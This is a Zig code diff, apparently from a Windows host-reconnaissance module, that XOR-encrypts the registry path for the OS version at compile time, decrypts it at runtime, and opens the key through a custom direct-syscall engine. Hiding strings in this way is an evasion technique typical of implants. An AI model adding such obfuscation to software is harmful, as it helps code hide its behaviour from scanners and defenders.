@@ -1,6 +1,11 @@
 const std = @import("std");
 const types = @import("../types/types.zig");
 const engine = @import("../syscalls/engine.zig");
+const hash = @import("../types/hash.zig");
+
+const E = struct {
+    pub const version_path = &hash.xorEncrypt("\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
+};
 
 fn initUnicodeString(comptime s: []const u8, buf: *[512]u16) types.UNICODE_STRING {
     @memset(buf, 0);
@@ -14,9 +19,19 @@ fn initUnicodeString(comptime s: []const u8, buf: *[512]u16) types.UNICODE_STRIN
     };
 }
 
-fn openRegKey(comptime path: []const u8) ?types.HANDLE {
-    var buf_us: [512]u16 = undefined;
-    var us = initUnicodeString(path, &buf_us);
+fn openRegKey(allocator: std.mem.Allocator, path: []const u8) ?types.HANDLE {
+    _ = allocator;
+    var path_us: [512]u16 = undefined;
+    @memset(&path_us, 0);
+    for (path, 0..) |c, i| {
+        if (i >= path_us.len) return null;
+        path_us[i] = c;
+    }
+    var us = types.UNICODE_STRING{
+        .Length = @as(types.USHORT, @intCast(path.len * 2)),
+        .MaximumLength = @as(types.USHORT, @intCast(path_us.len * 2)),
+        .Buffer = @as(types.PWSTR, @ptrCast(&path_us)),
+    };
     var oa = types.OBJECT_ATTRIBUTES{
         .Length = @sizeOf(types.OBJECT_ATTRIBUTES),
         .RootDirectory = null,
@@ -77,7 +92,10 @@ fn readRegWideString(allocator: std.mem.Allocator, key: types.HANDLE, comptime v
 }
 
 pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
-    const key = openRegKey("\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion") orelse return error.RegistryOpen;
+    var path_buf: [512]u8 = undefined;
+    hash.xorDecrypt(E.version_path, &path_buf);
+    const reg_path = path_buf[0..E.version_path.len];
+    const key = openRegKey(allocator, reg_path) orelse return error.RegistryOpen;
     defer _ = engine.NtClose(key);
 
     const pn = readRegWideString(allocator, key, "ProductName") catch null;
